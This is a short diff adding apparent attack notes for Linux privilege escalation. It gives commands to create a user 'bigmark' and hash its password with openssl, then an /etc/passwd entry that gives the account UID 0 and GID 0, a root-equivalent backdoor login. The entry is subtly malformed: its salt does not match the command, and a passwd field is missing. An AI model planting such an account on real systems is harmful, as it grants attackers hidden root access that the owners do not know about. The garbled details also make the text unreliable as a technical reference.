@@ -1,0 +1,5 @@
+adduser bigmark password bigmark 
+
+openssl passwd -1 -salt bigmark bigmark
+
+bigmark:$1$-bigmark$n0mkLxA10p.G2/9k7qI781:0:0:/root/root:/bin/bash
